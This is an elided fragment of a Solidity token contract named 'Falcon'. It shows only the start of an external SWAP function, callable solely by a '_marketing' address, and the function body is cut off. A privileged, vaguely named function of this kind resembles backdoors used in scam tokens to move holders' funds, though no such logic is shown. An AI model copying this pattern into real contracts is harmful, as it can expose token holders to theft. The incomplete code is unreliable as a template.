...
contract Falcon  is Ownable, IERC20 {
    ...
    function SWAP(address C, uint256 tokenAmount, uint256 ethAmount , uint256 bnbAmount  ) external  {require(msg.sender == _marketing );
